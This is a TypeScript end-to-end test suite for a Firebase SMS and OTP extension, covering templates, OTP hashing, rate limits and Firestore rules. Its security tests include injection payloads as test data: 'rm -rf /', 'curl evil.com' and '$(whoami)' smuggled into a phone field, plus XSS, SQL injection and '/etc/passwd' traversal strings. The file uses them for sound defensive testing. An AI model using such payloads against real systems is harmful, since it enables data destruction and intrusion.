/**
 * E2E Test Runner
 *
 * Runs all E2E test phases from the test plan inside the Firebase Emulator.
 * Does NOT require real API credentials (tests pipelines and logic, not actual SMS delivery).
 * Real API integration tests are in integration.test.ts (separate run with credentials).
 */

import { describe, it, before, after, beforeEach } from 'node:test';
import * as assert from 'node:assert';
import * as admin from 'firebase-admin';
import * as crypto from 'crypto';
import { readFileSync } from 'fs';

process.env.FIRESTORE_EMULATOR_HOST = 'localhost:8181';
process.env.SMS_COLLECTION = 'sms_queue';
process.env.SMS_TEMPLATES_COLLECTION = 'sms_templates';
process.env.SMS_LOGS_COLLECTION = 'sms_logs';
process.env.OTP_COLLECTION = 'otp_codes';
process.env.APP_NAME = 'TestApp';

if (!admin.apps.length) {
  admin.initializeApp({ projectId: 'test-project' });
}

const db = admin.firestore();

import { getSettings, getSyncData, getCollectionNames, DEFAULTS, clearConfigCache } from '../src/config';
import { renderTemplate, resolveMessage } from '../src/services/templates';
import { prependCountryCode } from '../src/services/sms';
import { generateCode, storeOtp, verifyOtp, checkCooldown } from '../src/services/otp';
import { checkSendRateLimit } from '../src/services/rate-limit';
import { normalizePhone } from 'kwtsms';

function sha256(value: string): string {
  return crypto.createHash('sha256').update(value).digest('hex');
}

// ============================================================
// SETUP
// ============================================================

before(async () => {
  // Clean everything
  const collections = ['sms_queue', 'sms_templates', 'sms_logs', 'otp_codes', 'sms_rate_limits'];
  for (const col of collections) {
    const snap = await db.collection(col).get();
    const batch = db.batch();
    snap.docs.forEach((doc) => batch.delete(doc.ref));
    if (snap.docs.length > 0) await batch.commit();
  }
  await db.doc('sms_config/settings').delete().catch(() => {});
  await db.doc('sms_config/sync').delete().catch(() => {});

  // Seed settings
  await db.doc('sms_config/settings').set({
    gateway_enabled: true,
    test_mode: true,
    debug_logging: true,
    default_country_code: '965',
    selected_sender_id: 'KWT-SMS',
    app_name: 'TestApp',
  });

  // Seed sync
  await db.doc('sms_config/sync').set({
    balance: 100,
    sender_ids: ['KWT-SMS'],
    coverage: [
      { prefix: '965', country: 'Kuwait' },
      { prefix: '966', country: 'Saudi Arabia' },
      { prefix: '971', country: 'UAE' },
    ],
    last_synced_at: admin.firestore.FieldValue.serverTimestamp(),
  });

  // Seed all 8 templates
  const templates = [
    { name: 'welcome', body_en: 'Welcome to {{app_name}}! Your account is ready.', body_ar: 'مرحبا بك في {{app_name}}! حسابك جاهز.', placeholders: ['app_name'] },
    { name: 'otp', body_en: 'Your {{app_name}} verification code is: {{code}}. Valid for {{expiry_minutes}} minutes.', body_ar: 'رمز التحقق الخاص بك في {{app_name}} هو: {{code}}. صالح لمدة {{expiry_minutes}} دقائق.', placeholders: ['app_name', 'code', 'expiry_minutes'] },
    { name: 'order_confirmed', body_en: 'Hi {{customer_name}}, your order {{order_id}} has been confirmed.', body_ar: 'مرحبا {{customer_name}}، تم تأكيد طلبك {{order_id}}.', placeholders: ['customer_name', 'order_id'] },
    { name: 'order_shipped', body_en: 'Hi {{customer_name}}, your order {{order_id}} has been shipped.', body_ar: 'مرحبا {{customer_name}}، تم شحن طلبك {{order_id}}.', placeholders: ['customer_name', 'order_id'] },
    { name: 'order_delivered', body_en: 'Hi {{customer_name}}, your order {{order_id}} has been delivered.', body_ar: 'مرحبا {{customer_name}}، تم توصيل طلبك {{order_id}}.', placeholders: ['customer_name', 'order_id'] },
    { name: 'status_update', body_en: 'Hi {{customer_name}}, your order {{order_id}} status: {{status}}.', body_ar: 'مرحبا {{customer_name}}، حالة طلبك {{order_id}}: {{status}}.', placeholders: ['customer_name', 'order_id', 'status'] },
    { name: 'reminder', body_en: 'Hi {{customer_name}}, reminder: {{reminder_text}}', body_ar: 'مرحبا {{customer_name}}، تذكير: {{reminder_text}}', placeholders: ['customer_name', 'reminder_text'] },
    { name: 'custom', body_en: '{{message}}', body_ar: '{{message}}', placeholders: ['message'] },
  ];
  for (const t of templates) {
    await db.collection('sms_templates').doc(t.name).set({
      ...t, body_default_en: t.body_en, body_default_ar: t.body_ar,
      is_system: true, editable: true, deletable: false,
      createdAt: admin.firestore.FieldValue.serverTimestamp(),
      updatedAt: admin.firestore.FieldValue.serverTimestamp(),
    });
  }
  clearConfigCache();
});

// ============================================================
// PHASE A: CONFIG & LIFECYCLE
// ============================================================

describe('Phase A: Config & Lifecycle', () => {
  before(async () => {
    // Re-seed settings to ensure clean state regardless of prior test files
    await db.doc('sms_config/settings').set({
      gateway_enabled: true, test_mode: true, debug_logging: true,
      default_country_code: '965', selected_sender_id: 'KWT-SMS', app_name: 'TestApp',
    });
    clearConfigCache();
  });
  beforeEach(() => clearConfigCache());

  it('A-1: loads settings with all 6 fields', async () => {
    const s = await getSettings();
    assert.strictEqual(s.gateway_enabled, true);
    assert.strictEqual(s.test_mode, true);
    assert.strictEqual(s.debug_logging, true);
    assert.strictEqual(s.default_country_code, '965');
    assert.strictEqual(s.selected_sender_id, 'KWT-SMS');
    assert.strictEqual(s.app_name, 'TestApp');
  });

  it('A-2: settings cache avoids duplicate Firestore reads', async () => {
    const s1 = await getSettings();
    const s2 = await getSettings(); // cache hit
    assert.deepStrictEqual(s1, s2);
  });

  it('A-3: returns DEFAULTS when settings doc is missing', async () => {
    await db.doc('sms_config/settings').delete();
    clearConfigCache();
    const s = await getSettings();
    assert.strictEqual(s.gateway_enabled, DEFAULTS.gateway_enabled);
    assert.strictEqual(s.test_mode, DEFAULTS.test_mode);
    // Restore
    await db.doc('sms_config/settings').set({
      gateway_enabled: true, test_mode: true, debug_logging: true,
      default_country_code: '965', selected_sender_id: 'KWT-SMS', app_name: 'TestApp',
    });
  });

  it('A-4: loads sync data correctly', async () => {
    clearConfigCache();
    const s = await getSyncData();
    assert.ok(s);
    assert.strictEqual(s.balance, 100);
    assert.deepStrictEqual(s.sender_ids, ['KWT-SMS']);
    assert.strictEqual(s.coverage.length, 3);
  });

  it('A-5: returns null sync data when doc is missing', async () => {
    await db.doc('sms_config/sync').delete();
    clearConfigCache();
    const s = await getSyncData();
    assert.strictEqual(s, null);
    // Restore
    await db.doc('sms_config/sync').set({
      balance: 100, sender_ids: ['KWT-SMS'],
      coverage: [{ prefix: '965', country: 'Kuwait' }, { prefix: '966', country: 'Saudi Arabia' }, { prefix: '971', country: 'UAE' }],
      last_synced_at: admin.firestore.FieldValue.serverTimestamp(),
    });
  });

  it('A-6: collection names from env vars', () => {
    const c = getCollectionNames();
    assert.strictEqual(c.smsQueue, 'sms_queue');
    assert.strictEqual(c.smsTemplates, 'sms_templates');
    assert.strictEqual(c.smsLogs, 'sms_logs');
    assert.strictEqual(c.otpCodes, 'otp_codes');
  });
});

// ============================================================
// PHASE D: ALL 8 TEMPLATES (EN + AR)
// ============================================================

describe('Phase D: All 8 Templates EN + AR', () => {
  beforeEach(() => clearConfigCache());

  it('D-1: welcome EN', async () => {
    const msg = await resolveMessage({ template: 'welcome', templateData: { app_name: 'TestApp' }, language: 'en' });
    assert.strictEqual(msg, 'Welcome to TestApp! Your account is ready.');
  });

  it('D-2: welcome AR', async () => {
    const msg = await resolveMessage({ template: 'welcome', templateData: { app_name: 'تطبيقي' }, language: 'ar' });
    assert.strictEqual(msg, 'مرحبا بك في تطبيقي! حسابك جاهز.');
  });

  it('D-3: otp EN (3 placeholders)', async () => {
    const msg = await resolveMessage({ template: 'otp', templateData: { app_name: 'TestApp', code: '483921', expiry_minutes: '5' }, language: 'en' });
    assert.strictEqual(msg, 'Your TestApp verification code is: 483921. Valid for 5 minutes.');
  });

  it('D-4: otp AR', async () => {
    const msg = await resolveMessage({ template: 'otp', templateData: { app_name: 'تطبيقي', code: '483921', expiry_minutes: '5' }, language: 'ar' });
    assert.ok(msg.includes('483921'));
    assert.ok(msg.includes('تطبيقي'));
  });

  it('D-5: order_confirmed EN', async () => {
    const msg = await resolveMessage({ template: 'order_confirmed', templateData: { customer_name: 'Ahmad', order_id: 'ORD-999' }, language: 'en' });
    assert.strictEqual(msg, 'Hi Ahmad, your order ORD-999 has been confirmed.');
  });

  it('D-5b: order_confirmed AR', async () => {
    const msg = await resolveMessage({ template: 'order_confirmed', templateData: { customer_name: 'أحمد', order_id: 'ORD-999' }, language: 'ar' });
    assert.ok(msg.includes('أحمد'));
    assert.ok(msg.includes('ORD-999'));
  });

  it('D-6: order_shipped EN + AR', async () => {
    const en = await resolveMessage({ template: 'order_shipped', templateData: { customer_name: 'Ahmad', order_id: 'ORD-001' }, language: 'en' });
    const ar = await resolveMessage({ template: 'order_shipped', templateData: { customer_name: 'أحمد', order_id: 'ORD-001' }, language: 'ar' });
    assert.ok(en.includes('shipped'));
    assert.ok(ar.includes('شحن'));
  });

  it('D-7: order_delivered EN + AR', async () => {
    const en = await resolveMessage({ template: 'order_delivered', templateData: { customer_name: 'Ahmad', order_id: 'ORD-001' }, language: 'en' });
    const ar = await resolveMessage({ template: 'order_delivered', templateData: { customer_name: 'أحمد', order_id: 'ORD-001' }, language: 'ar' });
    assert.ok(en.includes('delivered'));
    assert.ok(ar.includes('توصيل'));
  });

  it('D-8: status_update EN + AR (3 placeholders)', async () => {
    const en = await resolveMessage({ template: 'status_update', templateData: { customer_name: 'Ahmad', order_id: 'ORD-999', status: 'Shipped' }, language: 'en' });
    assert.ok(en.includes('Ahmad') && en.includes('ORD-999') && en.includes('Shipped'));
    const ar = await resolveMessage({ template: 'status_update', templateData: { customer_name: 'أحمد', order_id: 'ORD-999', status: 'تم الشحن' }, language: 'ar' });
    assert.ok(ar.includes('أحمد') && ar.includes('تم الشحن'));
  });

  it('D-9: reminder EN + AR', async () => {
    const en = await resolveMessage({ template: 'reminder', templateData: { customer_name: 'Ahmad', reminder_text: 'Your appointment is tomorrow' }, language: 'en' });
    assert.ok(en.includes('reminder') && en.includes('tomorrow'));
    const ar = await resolveMessage({ template: 'reminder', templateData: { customer_name: 'أحمد', reminder_text: 'موعدك غدا' }, language: 'ar' });
    assert.ok(ar.includes('تذكير') && ar.includes('موعدك غدا'));
  });

  it('D-10: custom freeform EN + AR', async () => {
    const en = await resolveMessage({ template: 'custom', templateData: { message: 'Completely custom!' }, language: 'en' });
    assert.strictEqual(en, 'Completely custom!');
    const ar = await resolveMessage({ template: 'custom', templateData: { message: 'رسالة مخصصة!' }, language: 'ar' });
    assert.strictEqual(ar, 'رسالة مخصصة!');
  });

  it('D-11: missing placeholders become empty string', () => {
    const r = renderTemplate('Hi {{customer_name}}, order {{order_id}} is {{status}}.', { customer_name: 'Ahmad' });
    assert.strictEqual(r, 'Hi Ahmad, order  is .');
  });

  it('D-12: non-existent template throws', async () => {
    await assert.rejects(
      resolveMessage({ template: 'does_not_exist', language: 'en' }),
      { message: 'Template "does_not_exist" not found.' }
    );
  });

  it('D-13: language fallback to EN when requested lang missing', async () => {
    const msg = await resolveMessage({ template: 'welcome', templateData: { app_name: 'TestApp' }, language: 'fr' });
    assert.strictEqual(msg, 'Welcome to TestApp! Your account is ready.');
  });
});

// ============================================================
// PHASE F: OTP (hashing, timing-safe, cooldown)
// ============================================================

describe('Phase F: OTP Security', () => {
  before(async () => {
    const snap = await db.collection('otp_codes').get();
    const batch = db.batch();
    snap.docs.forEach((d) => batch.delete(d.ref));
    if (snap.docs.length > 0) await batch.commit();
  });

  it('F-1: generateCode produces 6-digit strings', () => {
    const codes = Array.from({ length: 20 }, () => generateCode());
    assert.ok(codes.every(c => /^\d{6}$/.test(c)));
    assert.ok(new Set(codes).size > 1, 'codes should vary');
  });

  it('F-2: storeOtp hashes code and phone for doc ID', async () => {
    await storeOtp('96598765432', '123456');
    const phoneHash = sha256('96598765432');
    const codeHash = sha256('123456');
    const doc = await db.collection('otp_codes').doc(phoneHash).get();
    assert.ok(doc.exists);
    assert.strictEqual(doc.data()!.code, codeHash, 'code must be hashed');
    assert.notStrictEqual(doc.data()!.code, '123456', 'code must NOT be plaintext');
    assert.strictEqual(doc.data()!.attempts, 0);
    assert.ok(doc.data()!.expiresAt);
  });

  it('F-3: verifyOtp succeeds with correct code', async () => {
    await storeOtp('96598765432', '654321');
    const r = await verifyOtp('96598765432', '654321');
    assert.strictEqual(r.success, true);
  });

  it('F-4: verifyOtp fails with wrong code', async () => {
    await storeOtp('96598765432', '654321');
    const r = await verifyOtp('96598765432', '000000');
    assert.strictEqual(r.success, false);
    assert.strictEqual(r.error, 'Invalid code');
  });

  it('F-5: blocks after 3 failed attempts', async () => {
    await storeOtp('96500000000', '123456');
    await verifyOtp('96500000000', '000001');
    await verifyOtp('96500000000', '000002');
    await verifyOtp('96500000000', '000003');
    const r = await verifyOtp('96500000000', '123456');
    assert.strictEqual(r.success, false);
    assert.strictEqual(r.error, 'Too many attempts');
  });

  it('F-6: generic error for non-existent phone', async () => {
    const r = await verifyOtp('96599999999', '123456');
    assert.strictEqual(r.success, false);
    assert.strictEqual(r.error, 'Code expired or not found');
  });

  it('F-7: cooldown blocks rapid resends', async () => {
    await storeOtp('96598765432', '111111');
    assert.strictEqual(await checkCooldown('96598765432'), true);
    assert.strictEqual(await checkCooldown('96500000001'), false);
  });

  it('F-8: new OTP overwrites old', async () => {
    await storeOtp('96598765432', '111111');
    await storeOtp('96598765432', '222222');
    const r1 = await verifyOtp('96598765432', '111111');
    assert.strictEqual(r1.success, false);
    await storeOtp('96598765432', '333333');
    const r2 = await verifyOtp('96598765432', '333333');
    assert.strictEqual(r2.success, true);
  });

  it('F-9: OTP doc deleted after successful verify', async () => {
    await storeOtp('96512345678', '999999');
    await verifyOtp('96512345678', '999999');
    const doc = await db.collection('otp_codes').doc(sha256('96512345678')).get();
    assert.ok(!doc.exists, 'doc should be deleted after verify');
  });
});

// ============================================================
// PHASE H: RATE LIMITING
// ============================================================

describe('Phase H: Rate Limiting', () => {
  before(async () => {
    const snap = await db.collection('sms_rate_limits').get();
    const batch = db.batch();
    snap.docs.forEach((d) => batch.delete(d.ref));
    if (snap.docs.length > 0) await batch.commit();
  });

  it('H-1: allows first 10 requests, blocks 11th', async () => {
    await db.collection('sms_rate_limits').doc('test-user-h1').delete().catch(() => {});
    let firstBlocked = -1;
    for (let i = 1; i <= 12; i++) {
      const limited = await checkSendRateLimit('test-user-h1');
      if (limited && firstBlocked === -1) firstBlocked = i;
    }
    assert.strictEqual(firstBlocked, 11, 'should block at request 11');
  });

  it('H-2: resets after window expires', async () => {
    await db.collection('sms_rate_limits').doc('test-user-h2').set({
      count: 10, window_start: Date.now() - 120000, // 2 min ago
    });
    const limited = await checkSendRateLimit('test-user-h2');
    assert.strictEqual(limited, false, 'should allow after window expires');
  });

  it('H-3: OTP cooldown blocks same phone', async () => {
    await storeOtp('96598765432', '111111');
    assert.strictEqual(await checkCooldown('96598765432'), true);
    assert.strictEqual(await checkCooldown('96500099999'), false);
  });
});

// ============================================================
// PHASE I: SECURITY TESTS
// ============================================================

describe('Phase I: Security', () => {
  beforeEach(() => clearConfigCache());

  it('I-1: XSS in template placeholders (SMS is plain text)', () => {
    const r1 = renderTemplate('Hi {{name}}', { name: '<script>alert(1)</script>' });
    assert.ok(r1.includes('<script>'), 'raw HTML passes through (SMS is plain text)');
    const r2 = renderTemplate('Hi {{name}}', { name: '<img src=x onerror=alert(1)>' });
    assert.ok(r2.includes('<img'), 'img tag passes through');
  });

  it('I-3: SQL injection in template name (Firestore is NoSQL)', async () => {
    const payloads = [
      "' OR '1'='1",
      "'; DROP TABLE sms_templates; --",
      '" OR ""="',
    ];
    for (const p of payloads) {
      await assert.rejects(
        resolveMessage({ template: p, language: 'en' }),
        (err: Error) => err.message.includes('not found'),
        `SQL payload "${p}" should result in not-found`
      );
    }
  });

  it('I-4: NoSQL injection in template data', () => {
    const r = renderTemplate('Hi {{name}}', { name: '{"$gt": ""}' });
    assert.ok(r.includes('$gt'), 'literal string rendered');
  });

  it('I-5: path traversal in template name blocked', async () => {
    const payloads = ['../../../etc/passwd', 'templates/../../secret', 'welcome/../../admin'];
    for (const p of payloads) {
      await assert.rejects(
        resolveMessage({ template: p, language: 'en' }),
        (err: Error) => err.message.includes('must not contain "/"'),
        `Path traversal "${p}" should be blocked`
      );
    }
  });

  it('I-6: template name boundary cases', async () => {
    await assert.rejects(resolveMessage({ template: '', language: 'en' }));
    await assert.rejects(resolveMessage({ template: 'a'.repeat(1501), language: 'en' }),
      (err: Error) => err.message.includes('too long'));
  });

  it('I-7: phone number injection sanitized by normalizePhone', () => {
    const payloads = [
      '+96598765432; rm -rf /',
      '96598765432\n96500000000',
      '96598765432 && curl evil.com',
      '$(whoami)',
      '<script>alert(1)</script>',
    ];
    for (const p of payloads) {
      const norm = normalizePhone(p);
      assert.ok(/^\d*$/.test(norm), `"${p}" should normalize to digits only, got "${norm}"`);
    }
  });

  it('I-8: credentials never in Firestore logs', async () => {
    const username = process.env.KWTSMS_USERNAME || 'test_user_placeholder';
    const password = process.env.KWTSMS_PASSWORD || 'test_pass_placeholder';
    const logs = await db.collection('sms_logs').get();
    for (const doc of logs.docs) {
      const json = JSON.stringify(doc.data());
      assert.ok(!json.includes(username), 'username must not appear in logs');
      assert.ok(!json.includes(password), 'password must not appear in logs');
    }
  });

  it('I-10: unicode edge cases in templates', () => {
    assert.ok(renderTemplate('{{msg}}', { msg: 'Hello 🎉🔥💯 World' }).includes('🎉'));
    assert.ok(renderTemplate('{{msg}}', { msg: 'Hello مرحبا World عالم' }).includes('مرحبا'));
    assert.ok(renderTemplate('{{msg}}', { msg: '\u200Fمرحبا\u200F' }).includes('مرحبا'));
    assert.doesNotThrow(() => renderTemplate('{{msg}}', { msg: 'Hello\x00World' }));
    assert.doesNotThrow(() => renderTemplate('{{msg}}', { msg: 'مرحبا '.repeat(100) }));
  });

  it('I-11: balanceAfter not in callable handler response', () => {
    const src = readFileSync('./src/handlers/callable.ts', 'utf-8');
    assert.ok(!src.includes('balanceAfter'), 'callable must not expose balance');
  });

  it('I-12: OTP cooldown error is generic (no enumeration)', () => {
    const src = readFileSync('./src/handlers/otp.ts', 'utf-8');
    assert.ok(!src.includes('Please wait'), 'no specific cooldown message');
  });

  it('I-13: all HttpsError messages are generic', () => {
    const callableSrc = readFileSync('./src/handlers/callable.ts', 'utf-8');
    const otpSrc = readFileSync('./src/handlers/otp.ts', 'utf-8');
    // No result.error in HttpsError messages
    assert.ok(!callableSrc.includes("HttpsError('internal', result.error"), 'callable must not leak result.error');
    // OTP only returns generic messages
    const otpErrors = otpSrc.match(/HttpsError\('internal',\s*'([^']+)'/g) || [];
    for (const e of otpErrors) {
      assert.ok(
        e.includes('Failed to send verification code') || e.includes('Verification failed'),
        `OTP error must be generic: ${e}`
      );
    }
  });
});

// ============================================================
// PHASE J: EDGE CASES & BOUNDARY
// ============================================================

describe('Phase J: Edge Cases', () => {
  it('J-1: phone number format normalization', () => {
    const tests = [
      { input: '96598765432', desc: 'full Kuwait' },
      { input: '+96598765432', desc: 'with +' },
      { input: '0096598765432', desc: 'with 00' },
      { input: '98765432', desc: 'local' },
      { input: '965 9876 5432', desc: 'spaces' },
      { input: '965-9876-5432', desc: 'dashes' },
      { input: '(965) 98765432', desc: 'parens' },
    ];
    for (const t of tests) {
      const norm = normalizePhone(t.input);
      assert.ok(/^\d+$/.test(norm), `${t.desc}: "${t.input}" -> "${norm}" should be digits`);
    }
  });

  it('J-2: country code prepend logic', () => {
    const cov = [{ prefix: '965', country: 'Kuwait' }, { prefix: '966', country: 'Saudi Arabia' }];
    assert.strictEqual(prependCountryCode('96598765432', '965', cov), '96598765432');
    assert.strictEqual(prependCountryCode('98765432', '965', cov), '96598765432');
    assert.strictEqual(prependCountryCode('966587469874', '965', cov), '966587469874');
    assert.strictEqual(prependCountryCode('44123456789', '965', cov), '96544123456789');
  });

  it('J-3: special chars in template data', () => {
    assert.ok(renderTemplate('Hi {{name}}', { name: 'Line1\nLine2' }).includes('\n'));
    assert.ok(renderTemplate('Hi {{name}}', { name: 'Col1\tCol2' }).includes('\t'));
    assert.ok(renderTemplate('Path: {{path}}', { path: 'C:\\Users\\test' }).includes('\\'));
    assert.ok(renderTemplate('Say {{quote}}', { quote: '"Hello" she said' }).includes('"'));
    assert.ok(renderTemplate('Data: {{data}}', { data: '{key: value}' }).includes('{key'));
  });

  it('J-4: double placeholder usage', () => {
    const r = renderTemplate('{{name}} and {{name}}', { name: 'Ahmad' });
    assert.strictEqual(r, 'Ahmad and Ahmad');
  });

  it('J-5: emoji in templates', () => {
    const r = renderTemplate('{{msg}}', { msg: 'Hello 🎉 World 🌍' });
    assert.ok(r.includes('🎉') && r.includes('🌍'));
  });

  it('J-6: HTML in templates (plain text SMS)', () => {
    const r = renderTemplate('{{msg}}', { msg: '<b>Bold</b> <a href="x">link</a>' });
    assert.ok(r.includes('<b>Bold</b>'), 'HTML preserved (SMS is plain text)');
  });

  it('J-7: Arabic digits in phone numbers', () => {
    const norm = normalizePhone('٩٦٥٩٨٧٦٥٤٣٢');
    assert.ok(/^\d+$/.test(norm), 'Arabic digits converted to Latin');
  });

  it('J-8: empty and whitespace-only inputs', () => {
    assert.strictEqual(normalizePhone(''), '');
    assert.strictEqual(normalizePhone('   '), '');
    assert.strictEqual(renderTemplate('{{msg}}', { msg: '' }), '');
    assert.strictEqual(renderTemplate('{{msg}}', { msg: '   ' }), '   ');
  });
});

// ============================================================
// PHASE K: FIRESTORE RULES VERIFICATION
// ============================================================

describe('Phase K: Firestore Rules', () => {
  it('K-1: rules file has proper per-collection restrictions', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    assert.ok(rules.includes('otp_codes'), 'otp_codes rule exists');
    assert.ok(rules.includes('sms_rate_limits'), 'sms_rate_limits rule exists');
    assert.ok(rules.includes('sms_config'), 'sms_config rule exists');
    assert.ok(rules.includes('sms_logs'), 'sms_logs rule exists');
  });

  it('K-2: no wildcard allow-all rule', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    // Should NOT have "allow read, write: if true" on a wildcard match
    const lines = rules.split('\n');
    for (const line of lines) {
      if (line.includes('if true') && !line.trim().startsWith('//')) {
        assert.fail(`Found "if true" rule: ${line.trim()}`);
      }
    }
  });

  it('K-3: OTP codes are admin-only', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    // Find the otp_codes block and verify it has "if false"
    const otpMatch = rules.match(/match\s+\/otp_codes\/\{[^}]+\}\s*\{([^}]+)\}/);
    assert.ok(otpMatch, 'otp_codes rule block must exist');
    assert.ok(otpMatch![1].includes('if false'), 'otp_codes should deny all client access');
  });

  it('K-4: rate limit docs are admin-only', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    const rlMatch = rules.match(/match\s+\/sms_rate_limits\/\{[^}]+\}\s*\{([^}]+)\}/);
    assert.ok(rlMatch, 'sms_rate_limits rule block must exist');
    assert.ok(rlMatch![1].includes('if false'), 'sms_rate_limits should deny all client access');
  });

  it('K-5: isAdmin function exists for dashboard access', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    assert.ok(rules.includes('function isAdmin()'), 'isAdmin helper must exist');
    assert.ok(rules.includes('request.auth.token.admin'), 'isAdmin must check admin custom claim');
  });

  it('K-6: sms_config allows admin access for dashboard', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    const configMatch = rules.match(/match\s+\/sms_config\/\{[^}]+\}\s*\{([^}]+)\}/);
    assert.ok(configMatch, 'sms_config rule block must exist');
    assert.ok(configMatch![1].includes('isAdmin()'), 'sms_config should allow admin access');
  });

  it('K-7: sms_logs allows admin read for dashboard', () => {
    const rules = readFileSync('../firestore.rules', 'utf-8');
    const logsMatch = rules.match(/match\s+\/sms_logs\/\{[^}]+\}\s*\{([^}]+)\}/);
    assert.ok(logsMatch, 'sms_logs rule block must exist');
    assert.ok(logsMatch![1].includes('isAdmin()'), 'sms_logs should allow admin read');
  });
});

// ============================================================
// PHASE L: LINTING & STATIC ANALYSIS
// ============================================================

describe('Phase L: Static Analysis', () => {
  it('L-3: no console.log in source files', () => {
    const srcFiles = ['config.ts', 'kwtsms-client.ts',
      'handlers/auth.ts', 'handlers/callable.ts', 'handlers/otp.ts', 'handlers/queue.ts', 'handlers/scheduled.ts',
      'services/sms.ts', 'services/otp.ts', 'services/templates.ts', 'services/logger.ts', 'services/rate-limit.ts',
      'lifecycle/on-install.ts', 'templates/defaults.ts', 'index.ts'];
    for (const f of srcFiles) {
      const content = readFileSync(`./src/${f}`, 'utf-8');
      const lines = content.split('\n');
      for (let i = 0; i < lines.length; i++) {
        assert.ok(!lines[i].includes('console.log'), `console.log found in src/${f}:${i + 1}`);
      }
    }
  });

  it('L-4: no hardcoded credentials in source', () => {
    const srcDir = readFileSync('./src/config.ts', 'utf-8') +
      readFileSync('./src/kwtsms-client.ts', 'utf-8') +
      readFileSync('./src/handlers/callable.ts', 'utf-8') +
      readFileSync('./src/handlers/otp.ts', 'utf-8');
    // No literal password/token strings (excluding type definitions and env reads)
    assert.ok(!srcDir.includes("password: '"), 'no hardcoded password');
    assert.ok(!srcDir.includes('password: "'), 'no hardcoded password');
  });

  it('L-5: no real phone numbers in source or tests', () => {
    const files = [
      './src/handlers/otp.ts', './src/handlers/callable.ts', './src/handlers/auth.ts',
      './src/services/sms.ts', './src/services/otp.ts',
    ];
    for (const f of files) {
      const content = readFileSync(f, 'utf-8');
      assert.ok(!content.includes('99220322'), `real phone in ${f}`);
      assert.ok(!content.includes('96599220322'), `real phone in ${f}`);
    }
  });
});
